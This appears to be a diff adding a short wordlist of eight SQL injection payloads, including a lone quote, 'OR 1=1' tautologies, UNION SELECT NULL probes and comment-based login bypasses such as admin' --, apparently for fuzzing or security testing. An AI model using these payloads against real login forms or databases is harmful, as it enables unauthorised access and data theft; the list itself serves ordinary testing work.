@@ -1,0 +1,8 @@
+'
+' OR '1'='1
+" OR "1"="1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+admin' --
+admin' #
+' OR 1=1# 
